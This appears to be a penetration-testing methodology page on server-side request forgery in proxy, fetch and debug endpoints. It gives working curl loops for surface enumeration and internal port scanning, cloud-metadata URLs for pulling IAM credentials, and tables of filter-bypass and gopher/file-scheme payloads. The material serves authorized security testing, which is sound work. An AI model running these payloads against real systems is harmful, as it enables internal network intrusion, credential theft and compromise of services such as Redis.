---
name: ssrf-proxy-endpoints
description: SSRF in app endpoints whose name contains proxy / fetch / debug / forward / preview / oauth-debug — the highest-yield surface for finding server-side request forgery
tags: [methodology, ssrf, proxy, debug, oauth, cloud-metadata, internal-scan]
source: Penlearn Local methodology
---

# SSRF in Proxy / Debug / Fetch Endpoints

> Any endpoint whose name contains `proxy`, `fetch`, `forward`, `preview`, `debug`, `import-url`, or `oauth-debug` is a default-suspect for SSRF. They exist to make the server perform requests on the client's behalf — the entire question is what the server **won't** let you request.

## Why this surface yields

The dev's mental model when writing these is "let the user point us at a URL we'll go grab for them." Without an explicit deny-list for internal addresses, the URL parameter gets used verbatim. Common offenders:

- `/api/templates/fetch?url=...` (template imports, observed on Arcane v1.13.0 — GHSA-ff24-4prj-gpmj)
- `/api/mcp/oauth/debug/proxy` (MCPJam Inspector — see [[mcpjam-inspector-abuse]])
- `/api/preview?url=...`, `/api/og?url=...`, `/api/screenshot?url=...`
- Webhook validators, OAuth callback testers, RSS importers
- "Connect to your own server" / federation endpoints

## Methodology

### 1. Enumerate the surface

Pull the OpenAPI / Swagger / API doc spec if exposed:

```bash
for p in /api/docs /api/openapi.json /api/spec /swagger.json /openapi.json /api-docs; do
  curl -s -o /tmp/s "$TARGET$p" && [ -s /tmp/s ] && echo "$p" && head -c 200 /tmp/s
done
```

If no spec, grep the JS bundle for fetch / axios / api-call patterns to extract the endpoint list:

```bash
grep -oE '"/api/[^"]{1,80}"' index.js | sort -u
```

### 2. Confirm with self-fetch

Confirm SSRF by pointing it at yourself first — eliminates blind-vs-not ambiguity:

```bash
curl -sk -X POST -H 'Content-Type: application/json' \
  -d '{"url":"http://YOUR_TUN0_IP:8000/marker","method":"GET","headers":{}}' \
  $TARGET/api/<endpoint>
# In a separate terminal: python3 -m http.server 8000 and watch for the GET /marker
```

Status + body returned → **full SSRF**. Only status code returned → **blind SSRF** (still useful with timing or OOB).

### 3. Probe the internal network

Once SSRF is confirmed, scan from inside the box:

```bash
# Loopback service discovery
for p in 22 80 443 3000 3306 5432 6379 8080 8443 9090 9200 11211 27017; do
  curl -sk -X POST -H 'Content-Type: application/json' \
    -d "{\"url\":\"http://127.0.0.1:$p/\",\"method\":\"GET\",\"headers\":{}}" \
    --max-time 3 $TARGET/api/<endpoint> -o /tmp/r -w "$p: %{http_code} size=%{size_download}\n"
done
```

### 4. Cloud metadata

If the target is on AWS/GCP/Azure, hit the IMDS endpoints (they only respond to the box itself):

```
AWS:    http://169.254.169.254/latest/meta-data/iam/security-credentials/
AWS v2: requires PUT /latest/api/token first — SSRF can chain both
GCP:    http://metadata.google.internal/computeMetadata/v1/  + Metadata-Flavor: Google header
Azure:  http://169.254.169.254/metadata/instance?api-version=2021-12-13 + Metadata: true
```

Stolen IAM creds → full account compromise. Document with the credential prefix only (never paste secrets into the report).

### 5. Bypass URL filters

If the endpoint blocks `127.0.0.1` / `localhost`:

| Bypass | Notes |
|--------|-------|
| `http://2130706433/` | Decimal IP for 127.0.0.1 |
| `http://0x7f.0x0.0x0.0x1/` | Hex octets |
| `http://[::1]:80/` | IPv6 loopback |
| `http://[::ffff:127.0.0.1]/` | IPv6-mapped IPv4 |
| `http://localhost.localdomain/` | Hostname allow-listed but resolves to 127.0.0.1 |
| `http://127.1/`, `http://0/` | Short-form addresses (work via Linux resolver) |
| `http://attacker.com@127.0.0.1/` | Userinfo trick (some validators stop at `@`) |
| `http://target.com#@127.0.0.1/` | Fragment trick |
| DNS rebinding | Domain that flips A record between validate and fetch |

### 6. Alternate URL schemes

Some HTTP clients accept more than `http://`:

| Scheme | Effect |
|--------|--------|
| `file:///etc/passwd` | Local file read (rare but devastating) |
| `gopher://127.0.0.1:6379/_...` | Forge full TCP requests — classic Redis-SSRF foothold |
| `dict://127.0.0.1:11211/stats` | Memcached info disclosure |
| `ftp://127.0.0.1/` | Banner grab |
| `ldap://127.0.0.1/` | Internal LDAP scan |

Test each one before concluding the SSRF is "only HTTP."

## Detection signals

| Signal | Confirms |
|--------|----------|
| Self-fetch returns expected body | Full SSRF — read internal responses |
| Self-fetch returns only status code | Blind SSRF — still chain via timing/OOB |
| `169.254.169.254` returns metadata JSON | Cloud SSRF — go after IAM creds |
| Loopback port returns different status than refused | Internal port enumerated |
| Gopher payload causes a Redis command to execute | Protocol-smuggling SSRF — typically RCE on the target service |

## Compliance mapping

- ttp_category: `ssrf`
- MITRE ATT&CK: T1090 (Proxy), T1583.006 (Acquire Infrastructure: Web Services)
- OWASP_TOP10: A10 (SSRF)
- CWE: CWE-918 (Server-Side Request Forgery)

## Cross-Reference

- [[mcpjam-inspector-abuse]] — `/api/mcp/oauth/debug/proxy` case study
- [[arcane-cve-chain]] — GHSA-ff24-4prj-gpmj template-fetch SSRF
- [[evidence-first]] — five-field template; `test_request` should include both the SSRF call and the internal response it surfaced
